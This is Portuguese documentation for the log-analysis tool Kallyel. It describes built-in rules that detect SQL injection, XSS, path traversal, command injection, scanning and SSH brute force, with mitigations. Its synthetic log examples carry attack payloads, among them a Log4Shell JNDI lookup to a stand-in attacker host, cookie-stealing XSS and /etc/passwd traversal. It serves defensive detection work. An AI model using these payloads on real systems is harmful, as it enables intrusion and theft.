# Regras de detecção embutidas

Kallyel: análise de logs para detecção de ataques web

> Este arquivo é **gerado** a partir dos YAML em `src/kallyel/rules/builtin/` por
> `python tests/data/render_rules_doc.py --update-docs`. Não edite à mão: um teste falha
> se ele ficar desatualizado. Os exemplos de log são sintéticos.

Cada regra mapeia para MITRE ATT&CK, e quando aplicável CWE e OWASP Top 10. Todas são
**heurísticas de triagem**: geram falsos positivos e não cobrem todo ataque. As lacunas
verificadas estão em [avaliacao.md](avaliacao.md), e o formato para escrever as suas está
em [Formato das regras](#formato-das-regras-yaml).

## Resumo

| Regra | Gravidade | Fase | Técnica ATT&CK | Exemplo de log | Mitigação |
|---|---|---|---|---|---|
| [`KALLYEL-APP-001`](#kallyel-app-001) | high | ação | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | `[2024-01-01 00:00:00] production.ERROR: Connection failed {"exception":"[object] (PDOException(code: 1045): S…` | Rotacionar o segredo exposto; filtrar campos sensíveis antes de logar (dontFlash, reportable/context); não registrar variáveis de ambiente nem parâmetros de conexão; restringir acesso ao log. |
| [`KALLYEL-AUTH-001`](#kallyel-auth-001) | high | tentativa | [T1110](https://attack.mitre.org/techniques/T1110/) | `2024-01-01T00:00:00+00:00 srv sshd[5000]: Failed password for invalid user root from 203.0.113.203 port 40000…` | Desabilitar senha e usar chaves; fail2ban ou limitação de taxa; restringir SSH por firewall/VPN; não expor SSH à internet quando possível. |
| [`KALLYEL-AUTH-002`](#kallyel-auth-002) | critical | sucesso | [T1110](https://attack.mitre.org/techniques/T1110/), [T1078](https://attack.mitre.org/techniques/T1078/) | `2024-01-01T00:00:00+00:00 srv sshd[5000]: Failed password for invalid user root from 203.0.113.203 port 40000…` | Tratar a conta como comprometida até prova em contrário: trocar credenciais, revisar a sessão aberta e os comandos executados, invalidar chaves e sessões, ativar autenticação multifator. |
| [`KALLYEL-AUTH-003`](#kallyel-auth-003) | medium | ação | [T1136.001](https://attack.mitre.org/techniques/T1136/001/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | `2024-01-01T00:01:40+00:00 srv sudo[5021]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash` | Confirmar com o administrador se a ação era esperada; restringir sudo a comandos específicos; auditar contas novas; registrar comandos com auditd. |
| [`KALLYEL-WEB-001`](#kallyel-web-001) | high | tentativa | [T1190](https://attack.mitre.org/techniques/T1190/) | `203.0.113.202 - - [01/Jan/2024:00:00:03 +0000] "GET /products?id=1+UNION+SELECT+null,null,null HTTP/1.1" 500 …` | Consultas parametrizadas; WAF; validação de entrada; usuário do banco com privilégios mínimos. |
| [`KALLYEL-WEB-002`](#kallyel-web-002) | medium | tentativa | [T1190](https://attack.mitre.org/techniques/T1190/) | `203.0.113.205 - - [01/Jan/2024:00:00:00 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.…` | Escapar a saída conforme o contexto; Content-Security-Policy; validar entrada; cookies com HttpOnly. |
| [`KALLYEL-WEB-003`](#kallyel-web-003) | high | tentativa | [T1190](https://attack.mitre.org/techniques/T1190/), [T1083](https://attack.mitre.org/techniques/T1083/) | `203.0.113.206 - - [01/Jan/2024:00:00:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 404 300 "…` | Não montar caminhos de arquivo com entrada do usuário; lista de permissões; resolver e validar o caminho final; desabilitar wrappers PHP desnecessários. |
| [`KALLYEL-WEB-004`](#kallyel-web-004) | medium | reconhecimento | [T1190](https://attack.mitre.org/techniques/T1190/), [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | `203.0.113.201 - - [01/Jan/2024:00:00:03 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (…` | Manter segredos fora do diretório público; bloquear dotfiles no servidor web; remover phpinfo e backups; rotacionar qualquer credencial que tenha respondido 200. |
| [`KALLYEL-WEB-005`](#kallyel-web-005) | medium | reconhecimento | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | `203.0.113.201 - - [01/Jan/2024:00:00:00 +0000] "GET /api HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (E…` | Bloquear ou limitar por IP/WAF; verificar se o alvo foi realmente explorado olhando os demais achados do mesmo IP. |
| [`KALLYEL-WEB-006`](#kallyel-web-006) | critical | tentativa | [T1190](https://attack.mitre.org/techniques/T1190/), [T1059](https://attack.mitre.org/techniques/T1059/) | `203.0.113.207 - - [01/Jan/2024:00:00:00 +0000] "GET /ping?host=127.0.0.1;id HTTP/1.1" 200 500 "-" "Mozilla/5.…` | Nunca passar entrada do usuário a shell ou eval; usar APIs sem shell; atualizar bibliotecas vulneráveis (ex.: Log4j); WAF; isolar o processo com privilégios mínimos. |
| [`KALLYEL-WEB-007`](#kallyel-web-007) | medium | reconhecimento | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | `203.0.113.201 - - [01/Jan/2024:00:00:00 +0000] "GET /api HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (E…` | Limitar taxa por IP (rate limiting, fail2ban); corrigir links quebrados para reduzir ruído; bloquear o IP se houver outros achados. |
| [`KALLYEL-WEB-008`](#kallyel-web-008) | medium | tentativa | [T1110](https://attack.mitre.org/techniques/T1110/) | `203.0.113.204 - - [01/Jan/2024:00:00:00 +0000] "POST /login HTTP/1.1" 401 120 "https://shop.example.test/logi…` | Limitar tentativas por IP e por conta; bloqueio temporário progressivo; autenticação multifator; alertar o dono da integração se for um cliente legítimo. |
| [`KALLYEL-WEB-009`](#kallyel-web-009) | medium | tentativa | [T1190](https://attack.mitre.org/techniques/T1190/) | `203.0.113.202 - - [01/Jan/2024:00:00:00 +0000] "GET /products?id=1'+or+'1'='1 HTTP/1.1" 500 80 "-" "Mozilla/5…` | Verificar o log da aplicação no mesmo horário; corrigir o erro tratado de forma insegura; validar entradas; limitar taxa por IP. |

## Detalhes por regra

### KALLYEL-APP-001

**Stack trace do Laravel com dado sensível no log**

- **Tipo:** padrão (regex) no campo `message`
- **Fontes:** laravel
- **Gravidade:** high; **fase do ataque:** ação
- **MITRE ATT&CK:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/)
- **CWE:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html), [CWE-209](https://cwe.mitre.org/data/definitions/209.html)
- **OWASP Top 10:** A09:2021
- **O que detecta:** Um erro registrado pela aplicação contém credenciais, chaves ou tokens. O problema é de higiene do log: quem lê o log passa a ter o segredo.
- **Falsos positivos prováveis:** Valores de exemplo ou dados fictícios em ambientes de desenvolvimento; mensagens que citam o nome do campo e um valor curto não secreto.
- **Mitigação:** Rotacionar o segredo exposto; filtrar campos sensíveis antes de logar (dontFlash, reportable/context); não registrar variáveis de ambiente nem parâmetros de conexão; restringir acesso ao log.
- **Lacunas conhecidas:** Só padrões conhecidos de segredo (nomes de variável, Bearer, base64:, AKIA, chave privada); nomes personalizados passam. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético): (linhas de um registro de várias linhas)

```text
[2024-01-01 00:00:00] production.ERROR: Connection failed {"exception":"[object] (PDOException(code: 1045): SQLSTATE[HY000] [1045] Access denied)
#12 /var/www/config/database.php(9): env('DB_PASSWORD=Sup3rS3cretValue')
```

### KALLYEL-AUTH-001

**Força bruta de SSH**

- **Tipo:** taxa por IP: 5 ou mais eventos em 120 s
- **Fontes:** authlog
- **Gravidade:** high; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1110](https://attack.mitre.org/techniques/T1110/)
- **CWE:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)
- **OWASP Top 10:** A07:2021
- **O que detecta:** Um mesmo IP acumulou 5 ou mais falhas de autenticação SSH em até 2 minutos.
- **Falsos positivos prováveis:** Usuário legítimo que esqueceu a senha; automação com chave ou senha antiga; vários usuários atrás do mesmo NAT.
- **Mitigação:** Desabilitar senha e usar chaves; fail2ban ou limitação de taxa; restringir SSH por firewall/VPN; não expor SSH à internet quando possível.
- **Lacunas conhecidas:** Só conta 'Failed ...'; servidor só com chave pública vê apenas 'Invalid user'; 'message repeated N times' conta uma vez; ataque lento ou distribuído passa. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético): (5 ou mais falhas do mesmo IP em 2 min)

```text
2024-01-01T00:00:00+00:00 srv sshd[5000]: Failed password for invalid user root from 203.0.113.203 port 40000 ssh2
```

### KALLYEL-AUTH-002

**Força bruta seguida de login com sucesso**

- **Tipo:** sequência por IP em 900 s: falhas de autenticação (≥5) → login com sucesso
- **Fontes:** authlog
- **Gravidade:** critical; **fase do ataque:** sucesso
- **MITRE ATT&CK:** [T1110](https://attack.mitre.org/techniques/T1110/), [T1078](https://attack.mitre.org/techniques/T1078/)
- **CWE:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)
- **OWASP Top 10:** A07:2021
- **O que detecta:** O mesmo IP errou a autenticação 5 ou mais vezes e, em seguida, conseguiu entrar, dentro de 15 minutos. Indica que a senha pode ter sido adivinhada.
- **Falsos positivos prováveis:** Usuário legítimo que errou a senha várias vezes e depois acertou.
- **Mitigação:** Tratar a conta como comprometida até prova em contrário: trocar credenciais, revisar a sessão aberta e os comandos executados, invalidar chaves e sessões, ativar autenticação multifator.
- **Lacunas conhecidas:** Agrupa por IP: falhas de um IP e sucesso de outro não se ligam. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético): (5 ou mais falhas e depois um sucesso, em 15 min)

```text
2024-01-01T00:00:00+00:00 srv sshd[5000]: Failed password for invalid user root from 203.0.113.203 port 40000 ssh2
2024-01-01T00:01:10+00:00 srv sshd[5020]: Accepted password for root from 203.0.113.203 port 41000 ssh2
```

### KALLYEL-AUTH-003

**Novo usuário local ou uso incomum de sudo**

- **Tipo:** padrão (regex) no campo `message`
- **Fontes:** authlog
- **Gravidade:** medium; **fase do ataque:** ação
- **MITRE ATT&CK:** [T1136.001](https://attack.mitre.org/techniques/T1136/001/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/)
- **CWE:** [CWE-269](https://cwe.mitre.org/data/definitions/269.html)
- **OWASP Top 10:** -
- **O que detecta:** Criação de conta local, ou comando sudo que abre um shell, altera contas ou edita sudoers. É uma heurística por lista de comandos, não por comparação com o comportamento habitual do administrador.
- **Falsos positivos prováveis:** Administradores que usam 'sudo -i' ou 'sudo bash' no dia a dia; criação planejada de contas.
- **Mitigação:** Confirmar com o administrador se a ação era esperada; restringir sudo a comandos específicos; auditar contas novas; registrar comandos com auditd.
- **Lacunas conhecidas:** Lista de comandos, não comparação com o comportamento habitual; \`sudo bash\` de rotina é falso positivo; outros binários que abrem shell passam. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
2024-01-01T00:01:40+00:00 srv sudo[5021]:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
2024-01-01T00:01:50+00:00 srv useradd[5022]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash, from=/dev/pts/0
```

### KALLYEL-WEB-001

**Possível SQL Injection na requisição**

- **Tipo:** padrão (regex) no campo `http_path_query`
- **Fontes:** apache, nginx
- **Gravidade:** high; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/)
- **CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
- **OWASP Top 10:** A03:2021
- **O que detecta:** Padrões típicos de SQLi na URL: UNION SELECT, condição sempre verdadeira, funções de atraso e consulta ao catálogo do banco.
- **Falsos positivos prováveis:** Aplicações que aceitam SQL ou texto técnico em buscas; documentação sobre bancos de dados.
- **Mitigação:** Consultas parametrizadas; WAF; validação de entrada; usuário do banco com privilégios mínimos.
- **Lacunas conhecidas:** Não vê corpo de POST (o log não o traz); só decodifica 2 camadas de %xx; não trata ofuscação por comentário SQL nem injeção numérica sem aspas. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
203.0.113.202 - - [01/Jan/2024:00:00:03 +0000] "GET /products?id=1+UNION+SELECT+null,null,null HTTP/1.1" 500 80 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
203.0.113.202 - - [01/Jan/2024:00:00:00 +0000] "GET /products?id=1'+or+'1'='1 HTTP/1.1" 500 80 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

### KALLYEL-WEB-002

**Possível XSS refletido na requisição**

- **Tipo:** padrão (regex) no campo `http_path_query`
- **Fontes:** apache, nginx
- **Gravidade:** medium; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/)
- **CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
- **OWASP Top 10:** A03:2021
- **O que detecta:** Marcações HTML e manipuladores de evento enviados na URL, típicos de tentativas de XSS refletido.
- **Falsos positivos prováveis:** Sites de documentação ou fóruns técnicos em que o parâmetro carrega código; links de redirecionamento com 'javascript:' legítimo (raro).
- **Mitigação:** Escapar a saída conforme o contexto; Content-Security-Policy; validar entrada; cookies com HttpOnly.
- **Lacunas conhecidas:** Só olha a URL; XSS armazenado, DOM XSS e payload em corpo ficam de fora; lista curta de manipuladores de evento. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
203.0.113.205 - - [01/Jan/2024:00:00:00 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 4000 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
203.0.113.205 - - [01/Jan/2024:00:00:05 +0000] "GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 4000 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

### KALLYEL-WEB-003

**Possível path traversal ou inclusão de arquivo local (LFI)**

- **Tipo:** padrão (regex) no campo `http_path_query`
- **Fontes:** apache, nginx
- **Gravidade:** high; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/), [T1083](https://attack.mitre.org/techniques/T1083/)
- **CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
- **OWASP Top 10:** A01:2021
- **O que detecta:** Sequências '../' (inclusive codificadas) e referências a arquivos do sistema ou a wrappers de stream do PHP.
- **Falsos positivos prováveis:** Páginas de documentação cujo caminho cita arquivos como /etc/passwd; clientes que enviam caminhos relativos sem normalizar.
- **Mitigação:** Não montar caminhos de arquivo com entrada do usuário; lista de permissões; resolver e validar o caminho final; desabilitar wrappers PHP desnecessários.
- **Lacunas conhecidas:** 2 camadas de decodificação; não trata variantes como \`..;/\`; wrappers de stream fora da lista. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
203.0.113.206 - - [01/Jan/2024:00:00:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 404 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
203.0.113.206 - - [01/Jan/2024:00:00:10 +0000] "GET /page?inc=php://filter/convert.base64-encode/resource=index HTTP/1.1" 200 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

### KALLYEL-WEB-004

**Acesso a arquivo sensível ou de configuração**

- **Tipo:** padrão (regex) no campo `http_path`
- **Fontes:** apache, nginx
- **Gravidade:** medium; **fase do ataque:** reconhecimento
- **MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/), [T1552.001](https://attack.mitre.org/techniques/T1552/001/)
- **CWE:** [CWE-538](https://cwe.mitre.org/data/definitions/538.html)
- **OWASP Top 10:** A05:2021
- **O que detecta:** Tentativa de ler arquivos que nunca deveriam ser públicos. A resposta 200 indica exposição real; 404 indica apenas sondagem (veja o status nas evidências).
- **Falsos positivos prováveis:** Varreduras de segurança autorizadas; ferramentas internas de monitoramento.
- **Mitigação:** Manter segredos fora do diretório público; bloquear dotfiles no servidor web; remover phpinfo e backups; rotacionar qualquer credencial que tenha respondido 200.
- **Lacunas conhecidas:** Lista fixa de nomes; 404 e 200 geram o mesmo achado (o status está nas evidências, não na gravidade). (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
203.0.113.201 - - [01/Jan/2024:00:00:03 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)"
203.0.113.201 - - [01/Jan/2024:00:00:19 +0000] "GET /.git/config HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)"
```

### KALLYEL-WEB-005

**User-Agent de ferramenta de varredura**

- **Tipo:** padrão (regex) no campo `user_agent`
- **Fontes:** apache, nginx
- **Gravidade:** medium; **fase do ataque:** reconhecimento
- **MITRE ATT&CK:** [T1595.002](https://attack.mitre.org/techniques/T1595/002/)
- **CWE:** -
- **OWASP Top 10:** -
- **O que detecta:** O User-Agent se identifica como um scanner conhecido. Atacantes podem trocar o User-Agent, então a ausência deste achado não prova ausência de varredura.
- **Falsos positivos prováveis:** Testes de segurança autorizados ou monitoramento próprio da empresa.
- **Mitigação:** Bloquear ou limitar por IP/WAF; verificar se o alvo foi realmente explorado olhando os demais achados do mesmo IP.
- **Lacunas conhecidas:** Só pega scanner que se identifica; trocar o User-Agent desliga a regra. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
203.0.113.201 - - [01/Jan/2024:00:00:00 +0000] "GET /api HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)"
```

### KALLYEL-WEB-006

**Possível injeção de comando ou execução remota de código**

- **Tipo:** padrão (regex) no campo `http_path_query`
- **Fontes:** apache, nginx
- **Gravidade:** critical; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/), [T1059](https://attack.mitre.org/techniques/T1059/)
- **CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html)
- **OWASP Top 10:** A03:2021
- **O que detecta:** Metacaracteres de shell seguidos de comandos comuns, expressões de log4shell, chamadas de execução do PHP e shells na URL.
- **Falsos positivos prováveis:** Buscas ou fóruns técnicos que citem comandos; parâmetros que usam '\|' ou ';' como separador seguido de um nome de comando.
- **Mitigação:** Nunca passar entrada do usuário a shell ou eval; usar APIs sem shell; atualizar bibliotecas vulneráveis (ex.: Log4j); WAF; isolar o processo com privilégios mínimos.
- **Lacunas conhecidas:** Lista curta de comandos e de metacaracteres; não trata quebra de linha (\`%0a\`) como separador. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético):

```text
203.0.113.207 - - [01/Jan/2024:00:00:00 +0000] "GET /ping?host=127.0.0.1;id HTTP/1.1" 200 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
203.0.113.207 - - [01/Jan/2024:00:00:10 +0000] "GET /api?x=${jndi:ldap://attacker.example.test/a} HTTP/1.1" 200 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

### KALLYEL-WEB-007

**Enumeração de recursos por pico de respostas 404**

- **Tipo:** taxa por IP: 30 ou mais eventos em 60 s
- **Fontes:** apache, nginx
- **Gravidade:** medium; **fase do ataque:** reconhecimento
- **MITRE ATT&CK:** [T1595.003](https://attack.mitre.org/techniques/T1595/003/)
- **CWE:** -
- **OWASP Top 10:** -
- **O que detecta:** Um mesmo IP gerou 30 ou mais respostas 404 em até 60 segundos, padrão de varredura por lista de palavras (gobuster, ffuf e similares).
- **Falsos positivos prováveis:** Páginas com muitos recursos quebrados (imagens, scripts) acessadas por um único usuário; robôs de indexação mal configurados; NAT corporativo com vários usuários atrás de um IP.
- **Mitigação:** Limitar taxa por IP (rate limiting, fail2ban); corrigir links quebrados para reduzir ruído; bloquear o IP se houver outros achados.
- **Lacunas conhecidas:** Um IP por vez: varredura lenta (abaixo de 30/min) ou distribuída entre muitos IPs passa. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético): (30 ou mais respostas 404 do mesmo IP em 60 s)

```text
203.0.113.201 - - [01/Jan/2024:00:00:00 +0000] "GET /api HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)"
```

### KALLYEL-WEB-008

**Muitas respostas 401/403 do mesmo IP**

- **Tipo:** taxa por IP: 15 ou mais eventos em 60 s
- **Fontes:** apache, nginx
- **Gravidade:** medium; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1110](https://attack.mitre.org/techniques/T1110/)
- **CWE:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)
- **OWASP Top 10:** A07:2021
- **O que detecta:** Um mesmo IP recebeu 15 ou mais respostas 401 ou 403 em até 60 segundos: tentativa de adivinhar credenciais ou de acessar áreas restritas.
- **Falsos positivos prováveis:** Aplicação cliente com token expirado repetindo requisições; scripts internos com credencial errada; NAT corporativo.
- **Mitigação:** Limitar tentativas por IP e por conta; bloqueio temporário progressivo; autenticação multifator; alertar o dono da integração se for um cliente legítimo.
- **Lacunas conhecidas:** Idem: abaixo de 15 respostas 401/403 por minuto, ou espalhado por IPs, não dispara. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético): (15 ou mais respostas 401/403 do mesmo IP em 60 s)

```text
203.0.113.204 - - [01/Jan/2024:00:00:00 +0000] "POST /login HTTP/1.1" 401 120 "https://shop.example.test/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

### KALLYEL-WEB-009

**Pico de erros 500 provocados pelo mesmo IP**

- **Tipo:** taxa por IP: 10 ou mais eventos em 60 s
- **Fontes:** apache, nginx
- **Gravidade:** medium; **fase do ataque:** tentativa
- **MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/)
- **CWE:** -
- **OWASP Top 10:** -
- **O que detecta:** Um mesmo IP provocou 10 ou mais erros 500 em até 60 segundos. Fuzzing e tentativas de exploração costumam derrubar o código da aplicação em caminhos inesperados.
- **Falsos positivos prováveis:** Falha real da aplicação ou do banco de dados (vários IPs afetados ao mesmo tempo); testes de carga; clientes legítimos repetindo uma ação que falha.
- **Mitigação:** Verificar o log da aplicação no mesmo horário; corrigir o erro tratado de forma insegura; validar entradas; limitar taxa por IP.
- **Lacunas conhecidas:** Não distingue falha real da aplicação de fuzzing; não cobre 502/503. (variações testadas em [avaliacao.md](avaliacao.md))

Exemplo (sintético): (10 ou mais respostas 500 do mesmo IP em 60 s)

```text
203.0.113.202 - - [01/Jan/2024:00:00:00 +0000] "GET /products?id=1'+or+'1'='1 HTTP/1.1" 500 80 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

## Formato das regras (YAML)

Regras adicionais vão em uma pasta passada com `--rules DIR` (ou `rules_dir` em
`kallyel.toml`). Valide antes de usar: `kallyel rules validate DIR`. O arquivo é lido
só com `yaml.safe_load`, e qualquer erro é reportado com o arquivo e o id da regra.

Campos comuns: `id` (`KALLYEL-<CATEGORIA>-<NNN>`), `title`, `severity` (`low`, `medium`,
`high`, `critical`), `sources` (`nginx`, `apache`, `authlog`, `laravel`), `explain`,
`false_positives`, `mitigation`; opcionais: `attack`, `cwe`, `owasp`, `phase`
(`recon`, `attempt`, `success`, `action`), `where`, `type`.

`where` filtra eventos por `action`, `http_method`, `http_status`, `source_type` ou `user`.

```yaml
# type: pattern (padrão; pode ser omitido)
id: KALLYEL-WEB-001
title: Possível SQL Injection na requisição
severity: high
sources: [nginx, apache]
attack: [T1190]
cwe: [CWE-89]
owasp: "A03:2021"
match:
  field: http_path_query      # decodifica %xx (até 2 camadas) por padrão
  any_regex:
    - '(?i)union(\s|\+|%20)+select'
explain: "..."
false_positives: "..."
mitigation: "..."
```

```yaml
# type: rate, por IP
type: rate
where: {http_status: [404]}
rate: {threshold: 30, window: 60s}   # unidades: s, m, h
```

```yaml
# type: sequence, por IP, etapas em ordem dentro da janela
type: sequence
window: 15m
steps:
  - {name: falhas, where: {action: [auth.failure]}, min_count: 5}
  - {name: sucesso, where: {action: [auth.success]}}
```

**Limites de segurança** (rejeitados ao carregar): regex com quantificador ilimitado
dentro de outro (como `(a+)+`, risco de ReDoS), regex maior que 500 caracteres, mais de
50 padrões por regra, arquivo maior que 256 KB. A checagem de ReDoS é uma heurística: veja
[threat-model.md](threat-model.md).
